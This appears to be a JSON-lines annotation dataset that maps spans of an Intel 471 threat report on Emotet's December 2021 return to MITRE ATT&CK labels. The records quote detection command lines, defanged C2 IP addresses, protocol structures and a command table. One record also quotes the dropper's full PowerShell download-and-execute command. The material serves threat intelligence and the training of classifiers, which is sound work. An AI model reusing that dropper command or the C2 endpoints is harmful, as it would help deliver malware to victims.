"intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "executes", "context_left": "As Emotet creates both a run key and a service during install, defenders can watch for any suspicious services created, especially if the process the service launched originates from `%LOCALAPPDATA%`. Additionally, during various command executions, defenders can look for the following command lines to detect Emotet when it", "context_right": "binaries. However, Emotet will have installed at this point and a full investigation will be needed:", "_context_left": "Additionally, during various command executions, defenders can look for the following command lines to detect Emotet when it ", "_context_right": " binaries.", "sentence_left": "As Emotet creates both a run key and a service during install, defenders can watch for any suspicious services created, especially if the process the service launched originates from `%LOCALAPPDATA%`.", "sentence_right": "However, Emotet will have installed at this point and a full investigation will be needed:", "label": "The adversary is trying to run malicious code. Execution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery.", "label_id": 588, "label_title": "Execution", "label_link": "https://attack.mitre.org/tactics/TA0002", "entity_class": "CE", "entity_type": "TACTIC", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "during various command executions", "context_left": "As Emotet creates both a run key and a service during install, defenders can watch for any suspicious services created, especially if the process the service launched originates from `%LOCALAPPDATA%`. Additionally,", "context_right": ", defenders can look for the following command lines to detect Emotet when it executes binaries. However, Emotet will have installed at this point and a full investigation will be needed:", "_context_left": "Additionally, ", "_context_right": ", defenders can look for the following command lines to detect Emotet when it executes binaries.", "sentence_left": "As Emotet creates both a run key and a service during install, defenders can watch for any suspicious services created, especially if the process the service launched originates from `%LOCALAPPDATA%`.", "sentence_right": "However, Emotet will have installed at this point and a full investigation will be needed:", "label": "The adversary is trying to run malicious code. Execution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery.", "label_id": 588, "label_title": "Execution", "label_link": "https://attack.mitre.org/tactics/TA0002", "entity_class": "CI", "entity_type": "TACTIC", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "command lines to detect Emotet when it executes binaries", "context_left": "As Emotet creates both a run key and a service during install, defenders can watch for any suspicious services created, especially if the process the service launched originates from `%LOCALAPPDATA%`. Additionally, during various command executions, defenders can look for the following", "context_right": ". However, Emotet will have installed at this point and a full investigation will be needed:", "_context_left": "Additionally, during various command executions, defenders can look for the following ", "_context_right": ".", "sentence_left": "As Emotet creates both a run key and a service during install, defenders can watch for any suspicious services created, especially if the process the service launched originates from `%LOCALAPPDATA%`.", "sentence_right": "However, Emotet will have installed at this point and a full investigation will be needed:", "label": "Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the underlying command prompts on Android and iOS devices. Unix shells can control every aspect of a system, with certain commands requiring elevated privileges that are only accessible if the device has been rooted or jailbroken.  Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.  Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with SSH. Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.  If the device has been rooted or jailbroken, adversaries may locate and invoke a superuser binary to elevate their privileges and interact with the system as the root user. This dangerous level of permissions allows the adversary to run special commands and modify protected system files.", "label_id": 1700, "label_title": "Command and Scripting Interpreter: Unix Shell", "label_link": "https://attack.mitre.org/techniques/T1623/001", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "Additionally, during various command executions, defenders can look for the following command lines to detect Emotet when it executes binaries. However,", "context_right": "will have installed at this point and a full investigation will be needed: * `Regsvr32[.]exe -s `", "_context_left": "However, ", "_context_right": " will have installed at this point and a full investigation will be needed:", "sentence_left": "Additionally, during various command executions, defenders can look for the following command lines to detect Emotet when it executes binaries.", "sentence_right": "* `Regsvr32[.]exe -s `", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "`Regsvr32[.]exe -s", "context_left": "However, Emotet will have installed at this point and a full investigation will be needed: *", "context_right": "` + Look for the execution of DLLs dropped to `%temp%`.", "_context_left": "* ", "_context_right": " `", "sentence_left": "However, Emotet will have installed at this point and a full investigation will be needed:", "sentence_right": "+ Look for the execution of DLLs dropped to `%temp%`.", "label": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.", "label_id": 385, "label_title": "Signed Binary Proxy Execution", "label_link": "https://attack.mitre.org/techniques/T1218", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "`Rundll32[.]exe , Control\\_RunDLL`", "context_left": "+ Look for the execution of DLLs dropped to `%temp%`. *", "context_right": "+ Look for the execution of DLLs dropped to `%temp%`.", "_context_left": "* ", "_context_right": "", "sentence_left": "+ Look for the execution of DLLs dropped to `%temp%`.", "sentence_right": "+ Look for the execution of DLLs dropped to `%temp%`.", "label": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.", "label_id": 385, "label_title": "Signed Binary Proxy Execution", "label_link": "https://attack.mitre.org/techniques/T1218", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "```", "context_left": "}", "context_right": "Emotet no longer delivers any modules until the process list module has been received successfully and the C2 has received the process list from the bot.", "_context_left": "", "_context_right": "", "sentence_left": "}", "sentence_right": "Emotet no longer delivers any modules until the process list module has been received successfully and the C2 has received the process list from the bot.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://78.47.204.80:443", "context_left": "* hxxps://195.154.146.35:443", "context_right": "**What we suggest for remediation**", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://195.154.146.35:443", "sentence_right": "**What we suggest for remediation**", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* ```", "context_left": "The document uses the following commands to spawn PowerShell and attempt to download and execute the malware:", "context_right": "\"C:\\Windows\\System32\\cmd[.]exe\" /c start /B powershell $dfkj=\"$strs=\\\"\".Split(\\\",\\\");foreach($st in $strs){$r1=Get-Random;$r2=Get-Random;$tpth=\\\"c:\\programdata\\\\\\\"+$r1+\\\"[.]dll\\\";Invoke-WebRequest -Uri $st -OutFile $tpth;if(Test-Path $tpth){$fp=\\\"c:\\windows\\syswow64\\rundll32[.]exe\\\";$a=$tpth+\\\",f\\\"+$r2;Start-Process $fp -ArgumentList $a;break;}};\";IEX $dfkj", "_context_left": "", "_context_right": "", "sentence_left": "The document uses the following commands to spawn PowerShell and attempt to download and execute the malware:", "sentence_right": "\"C:\\Windows\\System32\\cmd[.]exe\" /c start /B powershell $dfkj=\"$strs=\\\"\".Split(\\\",\\\");foreach($st in $strs){$r1=Get-Random;$r2=Get-Random;$tpth=\\\"c:\\programdata\\\\\\\"+$r1+\\\"[.]dll\\\";Invoke-WebRequest -Uri $st -OutFile $tpth;if(Test-Path $tpth){$fp=\\\"c:\\windows\\syswow64\\rundll32[.]exe\\\";$a=$tpth+\\\",f\\\"+$r2;Start-Process $fp -ArgumentList $a;break;}};\";IEX $dfkj", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://51.68.175.8:8080", "context_left": "* hxxps://158.69.222.101:443", "context_right": "* hxxps://45.118.135.203:7080", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://158.69.222.101:443", "sentence_right": "* hxxps://45.118.135.203:7080", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "}", "context_left": "uint8\\\\_t process\\\\_name\\\\_buffer[process\\\\_name\\\\_buffer\\\\_size]; //separated by commas", "context_right": "```", "_context_left": "", "_context_right": "", "sentence_left": "uint8\\\\_t process\\\\_name\\\\_buffer[process\\\\_name\\\\_buffer\\\\_size]; //separated by commas", "sentence_right": "```", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Our initial analysis found some similarities between the new version and what was previously used.", "context_left": "While it took months to do, it looks like those behind Emotet have recovered.", "context_right": "However, given further examination, we have found distinct differences, including the encryption used for communication, additional commands and reconfigurations in several pieces of the communication protocol.", "_context_left": "", "_context_right": "", "sentence_left": "While it took months to do, it looks like those behind Emotet have recovered.", "sentence_right": "However, given further examination, we have found distinct differences, including the encryption used for communication, additional commands and reconfigurations in several pieces of the communication protocol.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "uint32\\\\_t process\\\\_name\\\\_buffer\\\\_size;", "context_left": "uint8\\\\_t victim\\\\_id[victim\\\\_id\\\\_size]; // hostname + hex volume serial number", "context_right": "uint8\\\\_t process\\\\_name\\\\_buffer[process\\\\_name\\\\_buffer\\\\_size]; //separated by commas", "_context_left": "", "_context_right": "", "sentence_left": "uint8\\\\_t victim\\\\_id[victim\\\\_id\\\\_size]; // hostname + hex volume serial number", "sentence_right": "uint8\\\\_t process\\\\_name\\\\_buffer[process\\\\_name\\\\_buffer\\\\_size]; //separated by commas", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://138.185.72.26:8080", "context_left": "* hxxps://103.8.26.102:8080", "context_right": "* hxxps://178.79.147.66:8080", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://103.8.26.102:8080", "sentence_right": "* hxxps://178.79.147.66:8080", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "uint32\\\\_t hash\\\\_size; // 0x20", "context_left": "uint32\\\\_t cmd\\\\_id;", "context_right": "uint8\\\\_t data\\\\_hash[0x20]; // SHA-256 hash of Plaintext packet", "_context_left": "", "_context_right": "", "sentence_left": "uint32\\\\_t cmd\\\\_id;", "sentence_right": "uint8\\\\_t data\\\\_hash[0x20]; // SHA-256 hash of Plaintext packet", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://185.184.25.237:8080", "context_left": "* hxxps://191.252.196.221:8080", "context_right": "* hxxps://81.0.236.90:443", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://191.252.196.221:8080", "sentence_right": "* hxxps://81.0.236.90:443", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "```", "context_left": "The following structure was observed for the new Emotet initial check-in:", "context_right": "struct layer\\\\_1\\\\_packet", "_context_left": "", "_context_right": "", "sentence_left": "The following structure was observed for the new Emotet initial check-in:", "sentence_right": "struct layer\\\\_1\\\\_packet", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://195.154.146.35:443", "context_left": "* hxxps://37.44.244.177:8080", "context_right": "* hxxps://78.47.204.80:443", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://37.44.244.177:8080", "sentence_right": "* hxxps://78.47.204.80:443", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "uint32\\\\_t path\\\\_name\\\\_hash;", "context_left": "uint8\\\\_t victim\\\\_id[victim\\\\_id\\\\_size]; // hostname + hex volume serial number", "context_right": "uint32\\\\_t protocol\\\\_version; // 0x13465AA or 20211114 in decimal", "_context_left": "", "_context_right": "", "sentence_left": "uint8\\\\_t victim\\\\_id[victim\\\\_id\\\\_size]; // hostname + hex volume serial number", "sentence_right": "uint32\\\\_t protocol\\\\_version; // 0x13465AA or 20211114 in decimal", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "uint8\\\\_t process\\\\_name\\\\_buffer[process\\\\_name\\\\_buffer\\\\_size]; //separated by commas", "context_left": "uint32\\\\_t process\\\\_name\\\\_buffer\\\\_size;", "context_right": "}", "_context_left": "", "_context_right": "", "sentence_left": "uint32\\\\_t process\\\\_name\\\\_buffer\\\\_size;", "sentence_right": "}", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "| 1 | Update binary | Drops and starts binary after extracting modlist/drop directory and appending to command line as base64.", "context_left": "| **Opcode** | **Command name** | **Description** |", "context_right": "|", "_context_left": "", "_context_right": "", "sentence_left": "| **Opcode** | **Command name** | **Description** |", "sentence_right": "|", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://216.158.226.206:443", "context_left": "* hxxps://212.237.17.99:8080", "context_right": "* hxxps://41.76.108.46:8080", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://212.237.17.99:8080", "sentence_right": "* hxxps://41.76.108.46:8080", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "**Loader command table changes**", "context_left": "It then selects a random integer between zero and 14 and writes `0x00`to the offset of that integer.", "context_right": "In addition to protocol changes, Intel 471 analysts also observed changes to the new Emotet command table.", "_context_left": "", "_context_right": "", "sentence_left": "It then selects a random integer between zero and 14 and writes `0x00`to the offset of that integer.", "sentence_right": "In addition to protocol changes, Intel 471 analysts also observed changes to the new Emotet command table.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "uint8\\\\_t random\\\\_data[]; // Random data generated using BCryptGenRandom function", "context_left": "uint8\\\\_t encrypted\\\\_data[];", "context_right": "}", "_context_left": "", "_context_right": "", "sentence_left": "uint8\\\\_t encrypted\\\\_data[];", "sentence_right": "}", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://50.116.54.215:443", "context_left": "* hxxps://41.76.108.46:8080", "context_right": "* hxxps://210.57.217.132:8080", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://41.76.108.46:8080", "sentence_right": "* hxxps://210.57.217.132:8080", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "**Protocol Changes: L2**", "context_left": "Additionally, the module\\\\_id and module\\\\_job\\\\_id no longer are stored inside the module itself, but instead are stored in the command buffer received from the C2.", "context_right": "L2 for Emotet’s communication protocol adds the client command opcode and a SHA-256 hash of the L1 data.", "_context_left": "", "_context_right": "", "sentence_left": "Additionally, the module\\\\_id and module\\\\_job\\\\_id no longer are stored inside the module itself, but instead are stored in the command buffer received from the C2.", "sentence_right": "L2 for Emotet’s communication protocol adds the client command opcode and a SHA-256 hash of the L1 data.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://103.8.26.102:8080", "context_left": "* hxxps://210.57.217.132:8080", "context_right": "* hxxps://138.185.72.26:8080", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://210.57.217.132:8080", "sentence_right": "* hxxps://138.185.72.26:8080", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://107.182.225.142:8080", "context_left": "* hxxps://58.227.42.236:80", "context_right": "* hxxps://212.237.5.209:443", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://58.227.42.236:80", "sentence_right": "* hxxps://212.237.5.209:443", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "uint32\\\\_t system\\\\_info;", "context_left": "uint32\\\\_t loader\\\\_version; // 0x2710", "context_right": "uint32\\\\_t session\\\\_id;", "_context_left": "", "_context_right": "", "sentence_left": "uint32\\\\_t loader\\\\_version; // 0x2710", "sentence_right": "uint32\\\\_t session\\\\_id;", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://177.72.80.14:7080", "context_left": "* hxxps://207.148.81.119:8080", "context_right": "* hxxps://51.210.242.234:8080", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://207.148.81.119:8080", "sentence_right": "* hxxps://51.210.242.234:8080", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://195.77.239.39:8080", "context_left": "* hxxps://54.37.228.122:443", "context_right": "* hxxps://78.46.73.125:443", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://54.37.228.122:443", "sentence_right": "* hxxps://78.46.73.125:443", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "![Image 3 proto format]()", "context_left": "This structure can also be observed in the image below:", "context_right": "The image depicts the structure for Emotet's initial check-in.", "_context_left": "", "_context_right": "", "sentence_left": "This structure can also be observed in the image below:", "sentence_right": "The image depicts the structure for Emotet's initial check-in.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "+ Look for the execution of DLLs dropped to `%temp%`.", "context_left": "* `Regsvr32[.]exe -s `", "context_right": "* `Rundll32[.]exe , Control\\_RunDLL`", "_context_left": "", "_context_right": "", "sentence_left": "* `Regsvr32[.]exe -s `", "sentence_right": "* `Rundll32[.]exe , Control\\_RunDLL`", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://207.38.84.195:8080", "context_left": "* hxxps://45.118.135.203:7080", "context_right": "* hxxps://103.75.201.2:443", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://45.118.135.203:7080", "sentence_right": "* hxxps://103.75.201.2:443", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://81.0.236.90:443", "context_left": "* hxxps://185.184.25.237:8080", "context_right": "* hxxps://188.165.214.166:7080", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://185.184.25.237:8080", "sentence_right": "* hxxps://188.165.214.166:7080", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* Epoch4", "context_left": "We are categorizing them as:", "context_right": "* Epoch5", "_context_left": "", "_context_right": "", "sentence_left": "We are categorizing them as:", "sentence_right": "* Epoch5", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* Epoch3", "context_left": "* Epoch2", "context_right": "The following IPs are currently observed in use for Epoch 4:", "_context_left": "", "_context_right": "", "sentence_left": "* Epoch2", "sentence_right": "The following IPs are currently observed in use for Epoch 4:", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* ```", "context_left": "```", "context_right": "\"C:\\windows\\syswow64\\rundll32[.]exe\" c:\\programdata\\219183368[.]dll,f920683129", "_context_left": "", "_context_right": "", "sentence_left": "```", "sentence_right": "\"C:\\windows\\syswow64\\rundll32[.]exe\" c:\\programdata\\219183368[.]dll,f920683129", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://188.165.214.166:7080", "context_left": "* hxxps://81.0.236.90:443", "context_right": "* hxxps://212.237.56.116:7080", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://81.0.236.90:443", "sentence_right": "* hxxps://212.237.56.116:7080", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "uint8\\\\_t module\\\\_id\\\\_array[module\\\\_id\\\\_array\\\\_size]; //if module\\\\_id\\\\_array\\\\_size is 0, this field is not included", "context_left": "uint32\\\\_t module\\\\_id\\\\_array\\\\_size;", "context_right": "}", "_context_left": "", "_context_right": "", "sentence_left": "uint32\\\\_t module\\\\_id\\\\_array\\\\_size;", "sentence_right": "}", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://110.232.117.186:8080", "context_left": "* hxxps://195.154.133.20:443", "context_right": "* hxxps://191.252.196.221:8080", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://195.154.133.20:443", "sentence_right": "* hxxps://191.252.196.221:8080", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "uint8\\\\_t encrypted\\\\_data[];", "context_left": "uint8\\\\_t enc\\\\_secret\\\\_key[0x40]; // ECDH key", "context_right": "uint8\\\\_t random\\\\_data[]; // Random data generated using BCryptGenRandom function", "_context_left": "", "_context_right": "", "sentence_left": "uint8\\\\_t enc\\\\_secret\\\\_key[0x40]; // ECDH key", "sentence_right": "uint8\\\\_t random\\\\_data[]; // Random data generated using BCryptGenRandom function", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "uint32\\\\_t loader\\\\_version; // 0x2710", "context_left": "uint32\\\\_t protocol\\\\_version; // 0x13465AA or 20211114 in decimal", "context_right": "uint32\\\\_t system\\\\_info;", "_context_left": "", "_context_right": "", "sentence_left": "uint32\\\\_t protocol\\\\_version; // 0x13465AA or 20211114 in decimal", "sentence_right": "uint32\\\\_t system\\\\_info;", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://104.251.214.46:8080", "context_left": "* hxxps://45.142.114.231:8080", "context_right": "* hxxps://176.104.106.96:8080", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://45.142.114.231:8080", "sentence_right": "* hxxps://176.104.106.96:8080", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "uint32\\\\_t session\\\\_id;", "context_left": "uint32\\\\_t system\\\\_info;", "context_right": "uint32\\\\_t module\\\\_id\\\\_array\\\\_size;", "_context_left": "", "_context_right": "", "sentence_left": "uint32\\\\_t system\\\\_info;", "sentence_right": "uint32\\\\_t module\\\\_id\\\\_array\\\\_size;", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "uint32\\\\_t protocol\\\\_version; // 0x13465AA or 20211114 in decimal", "context_left": "uint32\\\\_t path\\\\_name\\\\_hash;", "context_right": "uint32\\\\_t loader\\\\_version; // 0x2710", "_context_left": "", "_context_right": "", "sentence_left": "uint32\\\\_t path\\\\_name\\\\_hash;", "sentence_right": "uint32\\\\_t loader\\\\_version; // 0x2710", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "**Protocol Changes: L3**", "context_left": "| 1000 | 0x3E8 | Proclist check-in packet |", "context_right": "L3 for Emotet’s communication protocol contains the encrypted L2, the ECC key used to encrypt L2 and some randomly generated data that serves as padding.", "_context_left": "", "_context_right": "", "sentence_left": "| 1000 | 0x3E8 | Proclist check-in packet |", "sentence_right": "L3 for Emotet’s communication protocol contains the encrypted L2, the ECC key used to encrypt L2 and some randomly generated data that serves as padding.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "|", "context_left": "| 3 | Execute EXE | Drops and executes executable.", "context_right": "| 4 | Execute EXE as user | Drops and executes executable as a specific user.", "_context_left": "", "_context_right": "", "sentence_left": "| 3 | Execute EXE | Drops and executes executable.", "sentence_right": "| 4 | Execute EXE as user | Drops and executes executable as a specific user.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://45.142.114.231:8080", "context_left": "* hxxps://212.237.56.116:7080", "context_right": "* hxxps://104.251.214.46:8080", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://212.237.56.116:7080", "sentence_right": "* hxxps://104.251.214.46:8080", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://212.237.5.209:443", "context_left": "* hxxps://107.182.225.142:8080", "context_right": "* hxxps://195.154.133.20:443", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://107.182.225.142:8080", "sentence_right": "* hxxps://195.154.133.20:443", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
